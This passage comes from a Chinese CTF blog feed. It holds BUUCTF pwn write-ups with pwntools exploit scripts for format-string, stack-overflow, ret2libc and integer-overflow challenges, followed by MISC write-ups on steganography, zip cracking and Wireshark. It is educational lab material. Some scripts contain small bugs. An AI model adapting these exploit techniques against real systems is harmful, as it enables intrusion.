class="string">&#x27;/home/w/桌面/pwn&#x27;</span> )</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x0804C044</span>;</span><br><span class="line"></span><br><span class="line">payload = p32(addr) +  <span class="string">b&#x27;%10$n&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>查看保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220125232624084.png" alt="image-20220125232624084"></p><p>太可怕了，保护全开！！！</p><p>我们观察伪代码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220125232554495.png" alt="image-20220125232554495"></p><p>运行</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220125232817638.png" alt="image-20220125232817638"></p><p>可以发先，本题的思路，意外的简单——让var数值的第14个值等于17，就可以执行system函数，而var在bss段，单位大小为dd即4字节，var[13]即13*4，_QWORD为8字节，构造payload即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;/home/w/桌面/ciscn_2019_n_8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">13</span> * <span class="number">4</span> + p32(<span class="number">17</span>)</span><br><span class="line"><span class="comment">#payload = p32(17) * 14(都给17w)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>查看保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220126222439362.png" alt="image-20220126222439362"></p><p>ida查看伪代码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220126222520890.png" alt="image-20220126222520890"></p><p>进函数堪堪</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220126222543947.png" alt="image-20220126222543947"></p><p>这里有明显的可利用函数</p><p>查看buf所占空间</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220126222952194.png" alt="image-20220126222952194"></p><p>在函数中并没有<code>/bin/sh</code>，不过有不少system函数，shift + 12，发现有<code>/bin/sh</code>，思路至此敲定，从read入手，返回system与<code>/bin/sh</code>即可</p><p>esp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;, 27740)</span><br><span class="line"></span><br><span class="line"># system只能选取已经执行过的system !!!</span><br><span class="line">payload = b&#x27;a&#x27; * (136 + 4) +  p32(0x0804845C) + p32(0x0804A024)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>checksec一下</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201221020133.png" alt="image-20220201221020133"></p><p>发现只开了NX和RELRO，接下来查看并分析ida伪代码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201221158610.png" alt="image-20220201221158610"></p><p><strong>在参考众多WP之后</strong>，才看懂了代码的逻辑，</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201221440994.png" alt="image-20220201221440994"></p><p>调用的 <code>sub_80486BB()</code> 函数里有一个<code>alarm()</code>闹钟，会阻碍调试，而主函数中的<code>fd</code>是一个文件句柄，打开了一个给定随机值的文件，截断成四字节的int赋值给buf传入<code>sub_804871F()</code></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201221718503.png" alt="image-20220201221718503"></p><p>这个函数内部也没有明显的点，<code>sprintf() </code>将参数 a1 转换成字符串 s，下一行读入字符串 buf，v6 为其长度，接着把buf最后的字符去掉了，v1为其新长度</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201222552489.png" alt="image-20220201222552489"></p><p>溢出点应该在这个函数之内，通过控制参数a1尽可能的大（0xff就不错），触发<code>read(0, buf, a1)</code>的栈溢出，而想要向其输入较大的a1，通过分析函数，我们知道了，a1是上一个函数<code>sub_804871F()</code>的返回值，为了通过这个函数输入较大的a1，我们需要向buf中输入<code>\0</code>来防止<code>exit(0)</code>执行退出，即我们需要在<code>sub_804871F()</code>中也需要通过read进行一次栈溢出</p><p>我们查看buf所占的大小</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201230214120.png" alt="image-20220201230214120"></p><p>让 buf 的长度达到 8 就能覆盖掉 return 的变量</p><p>同时，我们查看程序中是否存在system()函数和’\bin\sh’</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201223537008.png" alt="image-20220201223537008"></p><p>很遗憾，没有 —— 不过没关系，题目给了我们对应的libc，我们可以通过执行程序获取write和system以及/bin/sh的偏差值，进而得出他们在程序中的地址，所以需要进行两次溢出，本题的类型，正是 —— ret2libc</p><p>我们构造payload的思路如下图所示</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/payload.png" alt="payload"></p><p>具体如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;, 26902)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span> )</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> *  <span class="number">7</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xE7</span> + <span class="number">4</span>) + p32(write_plt) + p32(main)</span><br><span class="line">payload1 += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">//u32就是把机器码转换w地址</span><br><span class="line">write_libc = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_libc = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_libc = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">base = write_addr - write_libc</span><br><span class="line">sys_addr = base + sys_libc</span><br><span class="line">binsh_addr = base + binsh_libc</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xE7</span> + <span class="number">4</span>) + p32(sys_addr) + p32(main) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>先查看保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220205215601286.png" alt="image-20220205215601286"></p><p>好耶耶耶耶耶耶耶耶·！！！只开了NX！！！</p><p>（ida打开之后，整个人都，不好，了!）</p><p>那一堆函数震惊到我，那简单至极的main函数让我欣喜，那黑深残的gets函数更让我破防</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220205225323244.png" alt="image-20220205225323244"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220205225352299.png" alt="image-20220205225352299"></p><p>当我们按下shift和F12时，有喜亦有忧</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220205225620722.png" alt="image-20220205225620722"></p><p>明显的flag和不存在的binsh</p><p>我们查看flag在哪里</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220205225701794.png" alt="image-20220205225701794"></p><p>在这之后，我认为只要让gets函数跳转到这个函数，再将a1与a2传入即可，而这种方法，在<strong>本地</strong>是切实<strong>可行</strong>的，而在<strong>远程</strong>是<strong>不行</strong>的！！！</p><p>为什么？</p><p>在查阅大佬们的WP之后，我明白了，由于我们跳转函数并输入值的手法是栈溢出，在执行完之后，程序便会崩溃，所以在本地我们可以接到它，而在远程，由于程序的崩溃，使得后续的交互 — interactive 无法正常执行，我们便无法得到返回的flag，因此，<strong>我们要在程序中执行exit函数，保证函数的正常退出，避免崩溃</strong></p><p>注意的是，32位程序调用函数约定：函数 返回地址 参数1 参数2 参数3…，因此我们要先把exit()的地址填上，再填a1、a2</p><p>找到地址</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220205230929235.png" alt="image-20220205230929235"></p><p>贡上WP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;/home/w/桌面/get_started_3dsctf_2016&#x27;</span> )</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x38</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line">flag_addr = <span class="number">0x080489A0</span></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(flag_addr) + p32(exit_addr) + p32(a1) + p32(a2)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="EX"><a href="#EX" class="headerlink" title="EX"></a>EX</h3><p>在看到师傅们的WP，明白了新的暴力解题方法</p><hr><h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><p>终于碰上个简单题了，注意本题后面的补充有新知识点！</p><p>查看保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220206225022234.png" alt="image-20220206225022234"></p><p>ida伪代码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220206225045374.png" alt="image-20220206225045374"></p><p>主函数让我们先输入一个值，再将这个值作为read函数的输入限制，但并不妨碍我们进行栈溢出</p><p>我们再看其它函数，发现了一个叫backdoor的函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220206225508626.png" alt="image-20220206225508626"></p><p>这个函数也确实没有欺骗我们，后门函数确实存在！</p><p>我们只需要输入一个较长的数值，保证buf被覆盖，同时，输入返回地址即可，但别忘了，本题与前面的有一点<strong>不同</strong>，是64位的，因此rbp占8字节</p><p>我们查看buf大小</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220206230455079.png" alt="image-20220206230455079"></p><p>构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;/home/w/桌面/bjdctf_2020_babystack&#x27;</span> )</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4006e6</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input the length of your name:\n&quot;</span>, <span class="string">&quot;50&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> + <span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="整数溢出（部分）"><a href="#整数溢出（部分）" class="headerlink" title="整数溢出（部分）"></a>整数溢出（部分）</h3><p>在写完本题查看其它师傅写的WP时，发现了这个题的进阶体（原型？）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/bjdctf_2020_babystack.jpg" alt="bjdctf_2020_babystack"></p><p>此题大致思路（甚至是WP）都与上题相差不多，但是对输入的值，即read的范围做出要求，即不能大于10，而单单buf的地址就已经比10多了，我们该怎样，才能绕过这一层判断呢？答案就是整数溢出</p><p>在计算机中。有符号数用二进制表示。表示负数的时候。将二进制最高为来表示数字的符号，最高为是1就是负数。最高位是0就表是正数，当有符号数溢出时。会从最小的值开始，-xxxxx然后依次+1。</p><p>既然有“有符号数”，当然也存在着“无符号数”，他们的范围如下</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220206231327253.png" alt="image-20220206231327253"></p><p>其危害主要有以下几点</p><p>（1）数据截断：当发生溢出时。数据会被截断</p><blockquote><p>a\b\r为3个8位无符号整数。范围大小为0-255<br>a=11111111<br>b=00000001<br>r=a+b=100000000<br>由于a和b相加的值超出了8位。发生溢出。截取8位。r就变成了0</p></blockquote><p>（2）宽度溢出：当一个较小宽度的操作数被提升到了较大操作数一样的宽度。然后进行计算。如果计算结果放                             在较小宽度那里那么长度就会被截断为较小宽度。</p><blockquote><p>比如一个32位的运算结果。放到了16位寄存器。那么就会取后16位</p></blockquote><p>（3）改变符号：有符号整数溢出时。就会改变正负。</p><blockquote><p>0x7fffffff + 1 = 0x80000000 = - 2147483648</p></blockquote><p>（4）无符号与有符号转换：将有符号数赋给无符号数后。会从-1变成无符号数的最大数 当把无符号数赋给有符                                                号数，会从无符号数最大数变成-1、</p><p>因此在本题中，我们利用整数漏洞</p><blockquote><p>nbytes 为4字节的 signed int 类型(有符号数)，read 的输入限制为 unsigned int 类型(无符号数)，因此，我们可以输入 0x80000001 =&gt; 2147483649，signed int 类型被当做负数小于10，read函数中 unsigned int 类型被当成正整数 2147483649</p></blockquote><hr><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>查看保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207233536810.png" alt="image-20220207233536810"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Pwn入门" scheme="https://0410wzn.top/tags/Pwn%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_MISC_WP(更新ing)</title>
    <link href="https://0410wzn.top/2021/12/08/BUUCTF-MISC-WP-%E6%9B%B4%E6%96%B0ing/"/>
    <id>https://0410wzn.top/2021/12/08/BUUCTF-MISC-WP-%E6%9B%B4%E6%96%B0ing/</id>
    <published>2021-12-08T14:14:59.000Z</published>
    <updated>2022-01-27T12:20:54.424Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BuuCTF杂项WP"><a href="#BuuCTF杂项WP" class="headerlink" title="BuuCTF杂项WP"></a>BuuCTF杂项WP</h1><blockquote><p><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p></blockquote><h3 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h3><p>下载附件如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/aaa.gif"></p><p>仔细看，会发现有几帧明显有猫腻，果断stegsolve，发现如下几帧：</p><div align="center"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-25 (8).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26.png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (1).png" style="zoom: 70%;"></div><p>答案显而易见对吧！</p><hr><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>下载附件如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/QR_code.png"></p><p>别怕，扫描一下：</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(4).png" style="zoom:33%;"><p>很明显，flag似乎就在二维码里，但不能被直接扫描出来，这条路走不通，我们就换条路，从图像本身进行分析</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/Quicker_20211126_001734.png" style="zoom:50%;"><p>果然有东西！binwalk提取，发现是一个文件夹，里面是一个需要密码的压缩包，旁边是一个文本文档，名叫”4number“，提示很明显了——四位数字爆破</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126004943690.png" alt="image-20211126004943690"></p><p>解压，拿到flag！</p><hr><h3 id="你竟然赶我走！"><a href="#你竟然赶我走！" class="headerlink" title="你竟然赶我走！"></a>你竟然赶我走！</h3><p>hahaha，看看附件：</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/biubiu.jpg" style="zoom:50%;"><p>没啥可说的，010或者hex一看有惊喜</p><hr><h3 id="有N种方法解决"><a href="#有N种方法解决" class="headerlink" title="有N种方法解决"></a>有N种方法解决</h3><p>呐，这个附件打不开！！！—— 用010堪堪罢，惊喜出现</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(5).png"></p><p>编码开始的地方似乎是让我们把这些base64编码转成图像，说干就干！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126010508963.png" alt="image-20211126010508963"></p><p>扫一扫，得到答案！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126010624861.png" alt="image-20211126010624861" style="zoom:33%;"><hr><h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><p>下载附件如图：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126011348020.png" alt="image-20211126011348020"></p><p>又时候，题干很重要，”看不到图？是不是屏幕太小了“——图片的长宽或许有问题！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012245141.png" alt="image-20211126012245141" style="zoom:33%;"><p>根据这个，我们通过010调整宽高，成功获得完整图片，你说flag在哪里呐😍</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012749979.png" alt="image-20211126012749979" style="zoom:50%;"><h4 id="PNG文件分析"><a href="#PNG文件分析" class="headerlink" title="PNG文件分析"></a><font color="red" size="5"><strong>PNG文件分析</strong></font></h4><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012915721.png" alt="image-20211126012915721" style="zoom:50%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126013036241.png" alt="image-20211126013036241" style="zoom:67%;"><hr><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><p>emmm…都提示暴力破解了，那就乖乖暴力破解吧。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126014055933.png" alt="image-20211126014055933" style="zoom: 50%;"><p>嘿嘿嘿🤭，爆破出来了！</p><p>解压文件，得到一段base64编码，转换即有flag！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126014623349.png" alt="image-20211126014623349" style="zoom: 33%;"><hr><h3 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h3><p>图片里有啥信息？没啥好吧，010或者hex一看就ok</p><hr><h3 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h3><p>emmm…不是我不想写，而是没啥可写，球球你康康属性吧。。。</p><hr><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>lsb嘛，stegsolve康一康，发现以下三幅图I里都有一些竖形：</p><div align="center"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (9).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (10).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (11).png" style="zoom: 70%;"></div><p>Data Extract</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(12).png" style="zoom:50%;"><p>提示了PNG，我们将其save bin为PNG图片，得到二维码，扫描即可</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/1.png"></p><hr><h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a><font color="blue">Wireshark</font></h3><p>分析流量包，自然是使用wireshark了！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224306932.png" alt="image-20211126224306932" style="zoom: 80%;"><p>emmm…该看啥啊？</p><h4 id="划重点"><a href="#划重点" class="headerlink" title="划重点"></a><font color="red"><strong>划重点</strong></font></h4><p>经过查询之后，了解到了题目中“黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)”给了不止一个提示——<font color="red"><strong>登录用到的请求方式是POST或GET，一般网站采取POST方式（出于安全考虑），故先用POST为条件进行筛选</strong></font>筛选语句如下：</p><blockquote><p>http.request.method==POST</p></blockquote><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224745090.png" alt="image-20211126224745090"></p><p>只有一条！追踪其TCP流即可找到password，即flag</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224917569.png" alt="image-20211126224917569"></p><hr><h3 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h3><p>告诉4位数字了，爆破就完了呗，拜拜</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/Quicker_20211126_190251.png"></p><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a><font color="blue">zip伪加密</font></h3><h4 id="压缩包文件分析："><a href="#压缩包文件分析：" class="headerlink" title="压缩包文件分析："></a><font color="red" size="5"><strong>压缩包文件分析</strong></font>：</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011559649.png" alt="image-20211127011559649"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011629241.png" alt="image-20211127011629241"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011701328.png" alt="image-20211127011701328"></p><p>依据上述知识点，我们打开010</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127012016868.png" alt="image-20211127012016868"></p><p>发现前后各有1个09，伪加密木大错，都改为0000即可,之后就会发现压缩包可以加压力，里面的文件里就是flag</p><hr><h3 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h3><p>真就是：“二维码，谁用谁知道”，拜拜~</p><h3 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h3><p>提到流量分析，自然又是wireshark！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211128141314047.png" alt="image-20211128141314047"></p><p>过滤</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211128141343330.png" alt="image-20211128141343330"></p><p>flag出来了。</p><hr><h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><p>这个题啊，镜子里面啊，想隐写啊。<del>（010、binwalk找不出啥来才想的🐶,）</del></p><p>LSB!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-27.png" alt="2021-11-27"></p><hr><h3 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h3><p>得到图片，010和属性都没看出啥，于是binwalk，发现图片里面存在一个压缩包，提取即可。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/binwalk.png" alt="binwalk"></p><p>提取出来，爆破即可。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E7%88%86%E7%A0%B4.png" alt="爆破"></p><p>里面的文档即使flag</p><hr><h3 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h3><p>,,,跟上一个题不能说完全相似也只能说一模一样了，密码放在下面，溜了</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129164902137.png" alt="image-20211129164902137"></p><hr><h3 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h3><p>拿到题后，习惯性看一下属性，发现有一点值得注意的地方</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129165526695.png" alt="image-20211129165526695" style="zoom:50%;"><p>暂且放下，之后010看一看，binwalk看一看，出来个压缩包，唉唉，没密码怎么办？？？</p><p>抱着试一试的想法，填上备注的信息，有惊喜哦，哎嘿。</p><hr><h3 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h3><p>emmm…全都是TCP流有啥意思，我一个基本不会使wireshark的萌新直接追踪一下流flag就出来了、、、</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129181440188.png" alt="image-20211129181440188"></p><hr><h3 id="隐藏的钥匙"><a 